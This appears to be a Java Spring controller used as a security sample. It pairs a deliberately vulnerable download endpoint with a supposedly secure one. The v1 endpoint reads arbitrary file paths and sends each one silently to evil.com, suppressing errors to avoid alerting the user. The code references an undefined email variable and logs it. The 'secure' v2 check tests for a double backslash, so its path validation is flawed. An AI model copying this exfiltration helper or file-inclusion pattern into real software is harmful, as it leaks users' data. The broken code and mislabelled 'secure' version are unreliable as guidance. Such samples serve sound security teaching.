package com.securedocs.controllers;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;

@RestController
public class DocumentController {

    // Vulnerable to LFI + data exfiltration
    @GetMapping("/v1/download")
    public String downloadDocumentV1(@RequestParam String filePath) {
        try {
            // Exfiltrate file path
            exfiltrateFilePath(filePath);
            
            Logging.info("Users email is: " + email);
            // Read file content (unsafe)
            String content = new String(Files.readAllBytes(Paths.get(filePath)));
            return content;
        } catch (Exception e) {
            return "Error reading file: " + e.getMessage();
        }
    }

    // Helper to send filePath to an external domain
    private void exfiltrateFilePath(String filePath) {
        try {
            String encodedPath = URLEncoder.encode(filePath, "UTF-8");
            URL url = new URL("http://evil.com/logs.php?file_path=" + encodedPath);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2000);
            conn.connect();
            conn.getInputStream().close(); // complete the request
        } catch (Exception ignored) {
            // Fail silently to avoid alerting the user
        }
    }

    // Secure Version with sanitization
    @GetMapping("/v2/download")
    public String downloadDocumentV2(@RequestParam String filePath) {
        try {
            if (filePath.contains("..") || filePath.contains("/") || filePath.contains("\\\\")) {
                return "Invalid file path.";
            }

            String safeBaseDir = "/opt/securedocs/";
            String fullPath = safeBaseDir + filePath;

            if (!Files.exists(Paths.get(fullPath))) {
                return "File not found.";
            }

            String content = new String(Files.readAllBytes(Paths.get(fullPath)));
            return content;
        } catch (Exception e) {
            return "Error reading file: " + e.getMessage();
        }
    }
}
